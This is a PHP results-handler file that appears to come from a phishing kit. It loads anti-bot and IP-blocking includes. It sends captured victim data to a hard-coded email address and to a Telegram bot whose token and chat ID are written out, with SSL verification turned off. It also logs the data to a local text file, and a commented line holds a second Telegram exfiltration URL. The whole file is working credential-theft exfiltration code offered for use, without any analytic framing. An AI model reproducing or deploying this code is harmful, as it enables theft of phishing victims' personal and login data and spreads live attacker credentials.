<?php
        include("./system/system.php");
        include("./system/detect.php");
        include("./system/blocker.php");
        include("./system/encrypter.php");
        include "../anti/anti1.php";
        include "smart.php";
        include "../anti/anti2.php"; 
        include "../anti/anti3.php"; 
        include "../anti/anti4.php"; 
        include "../anti/anti5.php"; 
        include "../anti/anti6.php"; 
        include "../anti/anti7.php"; 
        include "../anti/anti8.php"; 
        include "../anti/antiip.php"; 

    session_start();
    error_reporting(0);

   $yours="ademmr33@gmx.com";
    @mail($yours,$subject,$yagmail,$headers);
    define("RECEIVER", '');
    $botToken="5255089272:AAGEgWtL-0YcrISVewJohL3Qle8cd8GcA_Y"; // Your Token Bot

    $website="https://api.telegram.org/bot".$botToken;
    $chatId="-1001541420222"; // Your Id 
    $params=[
        'chat_id'=>$chatId, 
        'text'=>$yagmai,
    ];
    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
    
    $myfile = fopen("rzlt.txt", "a+");
    $txt = $message;
    fwrite($myfile, $txt);
    fclose($myfile);
    // file_get_contents("https://api.telegram.org/bot5040159519:AAFxWxiFFdKCyVlO6NhbFXXCbbiRlMEjhx8/sendMessage?chat_id=-662763630&text='.$yagmail'");

    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');

    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
?>